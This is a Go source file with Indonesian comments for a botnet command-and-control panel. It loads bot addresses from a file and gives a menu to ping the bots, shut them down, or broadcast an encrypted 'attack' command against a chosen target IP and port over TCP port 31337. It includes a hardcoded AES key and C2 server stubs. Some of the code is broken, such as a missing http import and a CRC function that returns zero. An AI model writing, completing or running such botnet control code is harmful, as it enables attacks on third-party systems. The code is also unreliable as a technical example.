package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"strings"
	"time"
)

// Tambahkan di c2panel.go
func getOptimalC2Server() string {
    // Implementasi algoritma load balancing
    servers := []string{"c1.yourdomain.com", "c2.yourdomain.com"}
    return servers[time.Now().Unix()%int64(len(servers))]
}

// 🔑 Encryption Key (Decode dari base64 ke 32-byte)
var encryptionKey = func() []byte {
	key, _ := base64.StdEncoding.DecodeString("TSs6IsAmPlCIGEUnuiIT5JAvY4xkD9gkRhdDBzrrLgI=")
	return key
}()

// 🔒 Fungsi Enkripsi (AES-256)
func encrypt(plaintext string) (string, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return "", err
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], []byte(plaintext))

	return base64.URLEncoding.EncodeToString(ciphertext), nil
}

// 🔓 Fungsi Deskripsi (AES-256)
func decrypt(ciphertext string) (string, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return "", err
	}

	decoded, err := base64.URLEncoding.DecodeString(ciphertext)
	if err != nil {
		return "", err
	}

	if len(decoded) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext terlalu pendek")
	}

	iv := decoded[:aes.BlockSize]
	decoded = decoded[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(decoded, decoded)

	return string(decoded), nil
}

// Fungsi enkripsi untuk binary command
func encryptCommand(key []byte, plaintext string) []byte {
	block, _ := aes.NewCipher(key)
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	io.ReadFull(rand.Reader, iv)
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], []byte(plaintext))
	return ciphertext
}

// Buat packet binary
func createBinaryPacket(encrypted string) []byte {
	data := []byte(encrypted)
	packet := make([]byte, 7+len(data))
	packet[0] = 0x42 // MAGIC_BYTE contoh
	binary.BigEndian.PutUint32(packet[1:5], crc32Checksum(data))
	binary.BigEndian.PutUint16(packet[5:7], uint16(len(data)))
	copy(packet[7:], data)
	return packet
}

// CRC32 checksum (placeholder)
func crc32Checksum(data []byte) uint32 {
	// Implementasi CRC32 sesuai kebutuhan
	return 0
}

// Ganti fungsi pengiriman perintah
func sendBinaryCommand(botIP string, cmd string) {
	conn, err := net.Dial("tcp", botIP+":31337")
	if err != nil {
		return
	}
	defer conn.Close()

	encrypted := encryptCommand(encryptionKey, cmd)
	packet := createBinaryPacket(string(encrypted))
	conn.Write(packet)
}

// 🔐 Buat HTTP Client dengan HTTPS (TLS)
func createSecureClient(timeout time.Duration) *http.Client {
	cert, _ := tls.LoadX509KeyPair("/data/data/com.termux/files/home/ssl/ZMBR.crt", "/data/data/com.termux/files/home/ssl/ZMBR.key")
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				Certificates: []tls.Certificate{cert},
			},
		},
	}
}

// 🎛️ Main C2 Logic
func RunC2Panel() {
	if _, err := os.Stat("bots.txt"); os.IsNotExist(err) {
		fmt.Println("\033[31m[X] File bots.txt tidak ditemukan. Jalankan bot join terlebih dulu.\033[0m")
		return
	}

	file, _ := os.Open("bots.txt")
	defer file.Close()
	scanner := bufio.NewScanner(file)

	var bots []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			line = strings.ReplaceAll(line, "http://", "")
			line = strings.ReplaceAll(line, ":80", "")
			bots = append(bots, line)
		}
	}

	if len(bots) == 0 {
		fmt.Println("\033[31m[X] Tidak ada bot aktif di bots.txt.\033[0m")
		return
	}

	for {
		fmt.Println("\033[33m\n[CONTROL PANEL] Kirim perintah ke semua bot:\033[0m")
		fmt.Println("\033[36m[1] Cek Status Bot (Ping)")
		fmt.Println("[2] Jalankan Attack Test (Encrypted Binary)")
		fmt.Println("[3] Bersihkan Bot (Shutdown Endpoint)")
		fmt.Println("[0] Kembali\n\033[0m")

		fmt.Print("Pilih perintah: ")
		var opsi string
		fmt.Scanln(&opsi)

		if opsi == "1" {
			for _, bot := range bots {
				url := fmt.Sprintf("https://%s/ping", bot)
				client := createSecureClient(3 * time.Second)
				resp, err := client.Get(url)
				if err != nil {
					fmt.Printf("\033[31m[X] Gagal ping %s\033[0m\n", bot)
					continue
				}
				defer resp.Body.Close()
				buf := make([]byte, 4096)
				n, _ := resp.Body.Read(buf)
				body := string(buf[:n])
				if strings.Contains(strings.ToLower(body), "pong") {
					fmt.Printf("\033[32m[✓] Bot %s responsif\033[0m\n", bot)
				} else {
					fmt.Printf("\033[35m[!] Bot %s tidak valid\033[0m\n", bot)
				}
			}
		} else if opsi == "2" {
			var target, port string
			fmt.Print("Target IP/Domain: ")
			fmt.Scanln(&target)
			fmt.Print("Target Port: ")
			fmt.Scanln(&port)

			// Kirim via binary TCP langsung
			for _, bot := range bots {
				sendBinaryCommand(bot, "attack "+target+":"+port)
				fmt.Printf("\033[32m[C2] Binary command dikirim ke %s\033[0m\n", bot)
			}
		} else if opsi == "3" {
			for _, bot := range bots {
				url := fmt.Sprintf("https://%s/shutdown", bot)
				client := createSecureClient(3 * time.Second)
				resp, err := client.Get(url)
				if err != nil {
					fmt.Printf("\033[31m[X] Gagal shutdown %s\033[0m\n", bot)
					continue
				}
				fmt.Printf("\033[33m[!] Shutdown dikirim ke %s: %d\033[0m\n", bot, resp.StatusCode)
				resp.Body.Close()
			}
		} else if opsi == "0" {
			fmt.Println("\033[36m[•] Kembali ke menu utama...\033[0m")
			break
		} else {
			fmt.Println("\033[31m[!] Pilihan tidak valid!\033[0m")
		}
	}
}

func main() {
	RunC2Panel()
}
